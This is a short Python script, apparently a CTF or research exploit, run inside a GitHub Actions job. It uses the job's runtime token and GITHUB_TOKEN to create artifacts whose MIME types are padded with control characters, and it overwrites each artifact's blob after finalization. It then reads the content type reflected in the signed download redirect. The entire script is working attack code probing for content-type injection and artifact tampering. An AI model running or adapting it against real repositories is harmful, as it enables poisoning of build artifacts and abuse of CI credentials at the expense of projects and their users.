import os, uuid, urllib.request, urllib.error, urllib.parse
import solve

run_id, job_id = solve.backend_ids(os.environ['ACTIONS_RUNTIME_TOKEN'])
common = {'workflow_run_backend_id':run_id,'workflow_job_run_backend_id':job_id}
repo=os.environ['GITHUB_REPOSITORY']
secret=os.environ['GITHUB_TOKEN']
candidates=[
 ('nel_prefix','\x85application/json'),
 ('nel_suffix','application/json\x85'),
 ('nel_both','\x85application/json\x85'),
 ('nel_space_prefix',' \x85application/json'),
 ('nel_space_suffix','application/json\x85 '),
 ('nel_after_space','application/json \x85'),
 ('nel_before_space','\x85 application/json'),
 ('nel_suffix_param','application/json\x85; charset=utf-8'),
 ('fs_prefix','\x1capplication/json'),
 ('fs_suffix','application/json\x1c'),
 ('us_prefix','\x1fapplication/json'),
 ('us_suffix','application/json\x1f'),
]
class Stop(urllib.request.HTTPRedirectHandler):
 def redirect_request(self,*args): return None
opener=urllib.request.build_opener(Stop)
for label,mime in candidates:
 name='probe-'+uuid.uuid4().hex[:10]+'.json'
 try:
  created=solve.twirp('CreateArtifact',{**common,'name':name,'version':7,'mime_type':mime})
 except urllib.error.HTTPError as error:
  print(label,'create_http',error.code,flush=True); continue
 except Exception as error:
  print(label,'create_error',type(error).__name__,str(error)[:80],flush=True); continue
 try:
  url=created['signed_upload_url']
  solve.put_blob(url,b'{}')
  final=solve.finalize_artifact(common,name,b'{}')
  artifact_id=str(final['artifact_id'])
  body=solve.payload(repo,artifact_id)
  solve.put_blob(url,body)
  api='https://api.github.com/repos/'+repo+'/actions/artifacts/'+artifact_id+'/zip'
  req=urllib.request.Request(api,headers={'Authorization':'Bearer '+secret})
  try: response=opener.open(req,timeout=15)
  except urllib.error.HTTPError as error: response=error
  location=response.headers.get('Location','')
  query=urllib.parse.parse_qs(urllib.parse.urlsplit(location).query)
  rsct=query.get('rsct',[''])[0]
  print(label,'artifact_id',artifact_id,'rsct',repr(rsct),'sha256',__import__('hashlib').sha256(body).hexdigest(),flush=True)
 except Exception as error:
  print(label,'after_create_error',type(error).__name__,str(error)[:80],flush=True)
